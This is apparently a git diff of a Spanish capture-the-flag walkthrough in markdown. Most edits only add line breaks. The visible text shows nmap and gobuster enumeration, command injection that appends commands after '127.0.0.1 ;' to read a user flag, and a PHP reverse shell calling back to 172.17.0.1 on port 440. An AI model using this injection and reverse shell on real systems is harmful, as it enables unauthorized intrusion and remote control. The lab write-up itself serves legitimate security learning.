@@ -24,11 +24,12 @@ Lanzamos un escaneo inicial para identificar los puertos abiertos y los servicio
 sudo nmap -p- --open -n -Pn 172.17.0.2 -oN allPorts
 ```
 
+
 **Resultados del escaneo:**
 * **Puerto 80/TCP**: HTTP (Apache)
 
   <img width="1195" height="244" alt="1Escaneo" src="https://github.com/user-attachments/assets/b680b9ca-0d9f-4fc9-aa75-0b1aab6a0cc4" />
-
+<br><br>
 
 ### Enumeración de servicios
 Continuamos con un escaneo más profundo del servicio encontrado:
@@ -37,7 +38,7 @@ Continuamos con un escaneo más profundo del servicio encontrado:
 sudo nmap -sCV -p 80 172.17.0.2 -oN targeted
 ```
 <img width="1179" height="285" alt="2EScaneopuerto" src="https://github.com/user-attachments/assets/2adb932e-a7c8-42c3-a4c1-1cb2e47b8578" />
-
+<br><br>
 
 
 ### Enumeración Web (Puerto 80)
@@ -48,11 +49,10 @@ Aplicamos fuzzing de directorios para buscar rutas ocultas:
 gobuster dir -u http://172.17.0.2/ -w /usr/share/rockyou.txt -x php,txt,html -t 100 -k -r --no-error
 ```
 <img width="1918" height="480" alt="3gobuster" src="https://github.com/user-attachments/assets/781348f6-410a-44e6-b727-47d7c1b5c37d" />
-
+<br><br>
 
 Encontramos una ruta interesante /index.php asi que vamos a mirar que hay y ver si podemos explotarlo.
-
-
+<br><br>
 
 ---
 
@@ -75,18 +75,19 @@ Hay inyección de comandos, por lo que podemos mirar archivos como el usuario we
 
 
 <img width="1379" height="852" alt="6encontramos" src="https://github.com/user-attachments/assets/e2735431-3bf7-4db4-acc9-68a0e9e62059" />
+<br><br>
 Entramos al directorio del usuario web-admin para leer la flag del usuario.
+
 ```bash
 127.0.0.1 ;  cat /home/web-admin/user.txt
 ```
 
 <img width="1506" height="885" alt="7flagusuario" src="https://github.com/user-attachments/assets/c1d26f07-a1b5-41f8-bbe6-8358db60f015" />
-
+<br><br>
 La flag es correcta, vamos a continuar obtenido una consola más interactiva para poder escalar privilegios más facilmente.
+
 <img width="988" height="518" alt="8flag" src="https://github.com/user-attachments/assets/cf806bdf-c760-4547-8e9a-85f08d76a89a" />
-
-
-
+<br><br>
 
 
 ### Intrusión (Reverse Shell)
@@ -94,11 +95,11 @@ Logramos ejecutar comandos en el sistema y establecemos una *reverse shell* haci
 
 ```php
 # Comando ejecutado en el navegador web
-php -r '$sock=fsockopen("172.17.0.1",440);exec("/bin/bash <&3 >&3 2>&3");'
+127.0.0.1; php -r '$sock=fsockopen("172.17.0.1",440);exec("/bin/bash <&3 >&3 2>&3");'
 ```
 
 <img width="1372" height="821" alt="9revelsehell" src="https://github.com/user-attachments/assets/9bb10cb9-70d3-4eb2-a2d6-64e762e2ec23" />
-
+<br><br>
 
 
 Ponemos nuestro *netcat* a la escucha para recibir la conexión:
